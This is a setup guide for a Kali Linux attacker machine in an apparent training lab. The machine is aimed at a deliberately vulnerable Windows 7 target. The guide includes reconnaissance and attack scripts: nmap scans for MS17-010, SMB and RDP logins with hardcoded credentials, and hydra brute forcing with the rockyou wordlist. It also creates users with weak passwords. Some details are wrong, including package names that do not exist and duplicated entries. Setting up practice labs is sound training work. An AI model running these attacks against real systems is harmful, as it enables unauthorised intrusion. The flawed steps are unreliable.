# 🎯 Kali Linux Attacker Machine Setup Guide

## **Attacker Machine Configuration**
- **IP Address**: 172.16.200.136
- **OS**: Kali Linux 2024.x
- **Purpose**: Attacker machine for teams to use

## **Step 1: Install Kali Linux**

1. **Download Kali Linux ISO** (if not already installed)
2. **Install with these settings**:
   - Username: `kali`
   - Password: `kali` (or your preferred password)
   - Network: Configure static IP `172.16.200.136`
   - Install all tools (full installation recommended)

## **Step 2: Configure Network**

### **Set Static IP**
```bash
# Edit network configuration
sudo nano /etc/network/interfaces

# Add these lines:
auto eth0
iface eth0 inet static
    address 172.16.200.136
    netmask 255.255.255.0
    gateway 172.16.200.1
    dns-nameservers 8.8.8.8 8.1.1.1

# Restart networking
sudo systemctl restart networking
```

### **Test Connectivity**
```bash
# Test network connectivity
ping 172.16.26.132
ping 8.8.8.8
```

## **Step 3: Install/Update Tools**

### **Update Kali**
```bash
sudo apt update && sudo apt upgrade -y
sudo apt dist-upgrade -y
```

### **Install Additional Tools**
```bash
# Install additional penetration testing tools
sudo apt install -y \
    metasploit-framework \
    nmap \
    hydra \
    dirb \
    nikto \
    sqlmap \
    john \
    hashcat \
    wireshark \
    tcpdump \
    netcat \
    telnet \
    ftp \
    ssh \
    xfreerdp \
    rdesktop \
    enum4linux \
    smbmap \
    smbclient \
    impacket-tools \
    responder \
    crackmapexec \
    bloodhound \
    powershell-empire \
    cobalt-strike \
    burpsuite \
    owasp-zap \
    wpscan \
    gobuster \
    ffuf \
    nuclei \
    amass \
    subfinder \
    masscan \
    unicornscan \
    p0f \
    ettercap-text-only \
    dsniff \
    macchanger \
    aircrack-ng \
    reaver \
    wash \
    bully \
    pixiewps \
    wifite \
    kismet \
    wireshark-qt \
    tshark \
    ngrep \
    tcpflow \
    tcpreplay \
    hping3 \
    scapy \
    python3-scapy \
    python3-pip \
    python3-venv \
    git \
    curl \
    wget \
    unzip \
    zip \
    tar \
    gzip \
    bzip2 \
    xz-utils \
    vim \
    nano \
    tmux \
    screen \
    htop \
    iotop \
    nethogs \
    iftop \
    nload \
    vnstat \
    iperf3 \
    netperf \
    iptraf-ng \
    nethogs \
    iftop \
    nload \
    vnstat \
    iperf3 \
    netperf \
    iptraf-ng
```

## **Step 4: Configure Tools**

### **Configure Metasploit**
```bash
# Initialize Metasploit database
sudo msfdb init
sudo msfdb start

# Update Metasploit
sudo msfupdate

# Start Metasploit console
msfconsole
```

### **Configure Nmap**
```bash
# Update Nmap scripts
sudo nmap --script-updatedb

# Test Nmap
nmap -sV -sC 172.16.26.132
```

### **Configure Hydra**
```bash
# Download wordlists
sudo apt install wordlists
sudo ln -s /usr/share/wordlists/rockyou.txt.gz /usr/share/wordlists/rockyou.txt.gz
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

## **Step 5: Create Attack Scripts**

### **Create reconnaissance script**
Create file: `/home/kali/recon.sh`
```bash
#!/bin/bash
# Reconnaissance script for Windows 7 target

TARGET="172.16.26.132"
OUTPUT_DIR="/home/kali/recon_results"

mkdir -p $OUTPUT_DIR

echo "=== Starting Reconnaissance on $TARGET ==="

# Port scan
echo "1. Running port scan..."
nmap -sS -sV -O -p- $TARGET -oN $OUTPUT_DIR/port_scan.txt

# SMB enumeration
echo "2. Enumerating SMB..."
nmap -p 445 --script smb-protocols $TARGET -oN $OUTPUT_DIR/smb_protocols.txt
nmap -p 445 --script smb-vuln-ms17-010 $TARGET -oN $OUTPUT_DIR/ms17-010.txt
enum4linux -a $TARGET > $OUTPUT_DIR/enum4linux.txt

# Web enumeration
echo "3. Enumerating web services..."
nmap -p 80,443 --script http-enum $TARGET -oN $OUTPUT_DIR/web_enum.txt
nikto -h http://$TARGET -o $OUTPUT_DIR/nikto.txt

# Service enumeration
echo "4. Enumerating services..."
nmap -p 21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5900,8080 --script banner $TARGET -oN $OUTPUT_DIR/service_banners.txt

echo "=== Reconnaissance Complete ==="
echo "Results saved in: $OUTPUT_DIR"
```

### **Create exploitation script**
Create file: `/home/kali/exploit.sh`
```bash
#!/bin/bash
# Exploitation script for Windows 7 target

TARGET="172.16.26.132"
USERNAME="admin"
PASSWORD="password123"

echo "=== Starting Exploitation on $TARGET ==="

# Test MS17-010
echo "1. Testing MS17-010..."
nmap -p 445 --script smb-vuln-ms17-010 $TARGET

# Test SMB login
echo "2. Testing SMB login..."
smbclient -L //$TARGET -U $USERNAME%$PASSWORD

# Test RDP
echo "3. Testing RDP..."
xfreerdp /v:$TARGET /u:$USERNAME /p:$PASSWORD /cert-ignore

# Brute force test
echo "4. Testing brute force..."
hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt $TARGET smb -t 4

echo "=== Exploitation Complete ==="
```

### **Make scripts executable**
```bash
chmod +x /home/kali/recon.sh
chmod +x /home/kali/exploit.sh
```

## **Step 6: Configure ELK Integration**

### **Install Filebeat for logging**
```bash
# Download and install Filebeat
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
echo "deb https://artifacts.elastic.co/packages/7.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-7.x.list
sudo apt update
sudo apt install filebeat

# Configure Filebeat
sudo nano /etc/filebeat/filebeat.yml
```

### **Filebeat Configuration**
```yaml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/auth.log
    - /var/log/syslog
    - /home/kali/.msf4/logs/*.log

output.elasticsearch:
  hosts: ["172.16.200.136:9200"]
  index: "kali-logs-%{+yyyy.MM.dd}"

setup.kibana:
  host: "172.16.200.136:5601"
```

### **Start Filebeat**
```bash
sudo systemctl enable filebeat
sudo systemctl start filebeat
```

## **Step 7: Create Team Workspace**

### **Create team directories**
```bash
# Create workspace for teams
sudo mkdir -p /home/teams
sudo chmod 755 /home/teams

# Create directories for each team
sudo mkdir -p /home/teams/redteam
sudo mkdir -p /home/teams/blueteam

# Set permissions
sudo chown -R kali:kali /home/teams/redteam
sudo chown -R kali:kali /home/teams/blueteam
```

### **Create team setup script**
Create file: `/home/kali/setup_team.sh`
```bash
#!/bin/bash
# Team setup script

TEAM_NAME=$1
if [ -z "$TEAM_NAME" ]; then
    echo "Usage: $0 <team_name>"
    exit 1
fi

TEAM_DIR="/home/teams/$TEAM_NAME"
mkdir -p $TEAM_DIR

echo "=== Setting up workspace for $TEAM_NAME ==="

# Create team directories
mkdir -p $TEAM_DIR/{recon,exploits,flags,logs,notes}

# Copy tools and scripts
cp /home/kali/recon.sh $TEAM_DIR/
cp /home/kali/exploit.sh $TEAM_DIR/

# Create team notes
cat > $TEAM_DIR/notes/README.md << EOF
# $TEAM_NAME - Attack Notes

## Target Information
- Target IP: 172.16.26.132
- OS: Windows 7
- Purpose: Vulnerability exploitation

## Reconnaissance Results
- [ ] Port scan completed
- [ ] SMB enumeration completed
- [ ] Web enumeration completed
- [ ] Service enumeration completed

## Exploitation Attempts
- [ ] MS17-010 tested
- [ ] SMB brute force attempted
- [ ] RDP access tested
- [ ] Web vulnerabilities tested

## Flags Found
- [ ] MS17-010 flag
- [ ] SMBv1 flag
- [ ] Open ports flag
- [ ] Weak password flag
- [ ] RDP access flag

## Notes
Add your findings here...
EOF

echo "Team workspace created at: $TEAM_DIR"
```

## **Step 8: Testing Setup**

### **Test connectivity to target**
```bash
# Test basic connectivity
ping -c 4 172.16.26.132

# Test port scan
nmap -sS -p 445,3389,80 172.16.26.132

# Test SMB
smbclient -L //172.16.26.132 -U admin%password123

# Test RDP
xfreerdp /v:172.16.26.132 /u:admin /p:password123 /cert-ignore
```

### **Test ELK integration**
```bash
# Test Elasticsearch connection
curl -X GET "172.16.200.136:9200"

# Test Kibana
curl -X GET "172.16.200.136:5601"
```

## **Step 9: Security Considerations**

### **Network isolation**
```bash
# Ensure network isolation
iptables -A INPUT -s 172.16.26.0/24 -j ACCEPT
iptables -A INPUT -s 172.16.200.0/24 -j ACCEPT
iptables -A INPUT -j DROP
```

### **User management**
```bash
# Create team users
sudo useradd -m -s /bin/bash redteam
sudo useradd -m -s /bin/bash blueteam

# Set passwords
echo "redteam:password123" | sudo chpasswd
echo "blueteam:password123" | sudo chpasswd
```

## **Step 10: Monitoring Setup**

### **Create monitoring script**
Create file: `/home/kali/monitor.sh`
```bash
#!/bin/bash
# Monitoring script for attack activities

echo "=== Attack Activity Monitor ==="

# Monitor network connections
echo "Active connections to target:"
netstat -an | grep 172.16.26.132

# Monitor processes
echo "Active attack processes:"
ps aux | grep -E "(nmap|hydra|msfconsole|smbclient|xfreerdp)"

# Monitor logs
echo "Recent auth logs:"
tail -20 /var/log/auth.log

# Monitor filebeat
echo "Filebeat status:"
sudo systemctl status filebeat
```

---

## **🎯 Ready for Cyber Warfare!**

Your Kali Linux attacker machine is now configured with:
- ✅ All necessary penetration testing tools
- ✅ Network connectivity to target
- ✅ ELK stack integration
- ✅ Team workspaces
- ✅ Automated reconnaissance scripts
- ✅ Exploitation tools ready

Teams can now use this machine to attack the vulnerable Windows 7 server and earn points through the automated scoring system!
